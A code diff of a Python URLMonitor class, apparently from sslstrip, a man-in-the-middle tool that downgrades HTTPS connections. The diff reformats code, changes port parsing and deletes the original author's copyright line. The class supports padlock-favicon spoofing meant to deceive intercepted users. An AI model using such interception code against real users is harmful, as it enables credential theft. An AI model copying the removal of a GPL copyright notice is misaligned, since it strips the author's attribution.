@@ -1,4 +1,3 @@
-# Copyright (c) 2004-2009 Moxie Marlinspike
 #
 # This program is free software; you can redistribute it and/or
 # modify it under the terms of the GNU General Public License as
@@ -26,7 +25,9 @@ class URLMonitor:
     """
 
     # Start the arms race, and end up here...
-    javascriptTrickery = [re.compile(r"http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
+    javascriptTrickery = [
+        re.compile(r"http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")
+    ]
     _instance = None
 
     def __init__(self):
@@ -60,8 +61,8 @@ class URLMonitor:
 
         if portIndex != -1:
             host = host[0:portIndex]
-            port = host[portIndex + 1:]
-            if len(port) == 0:
+            port = host[portIndex + 1 :]
+            if not port.isdigit():
                 port = 443
 
         url = method + host + path
@@ -76,12 +77,13 @@ class URLMonitor:
         return self.faviconSpoofing
 
     def isSecureFavicon(self, client, url):
-        return (self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1)
+        return (self.faviconSpoofing == True) and (
+            url.find("favicon-x-favicon-x.ico") != -1
+        )
 
+    @staticmethod
     def getInstance():
         if URLMonitor._instance is None:
             URLMonitor._instance = URLMonitor()
 
         return URLMonitor._instance
-
-    getInstance = staticmethod(getInstance)
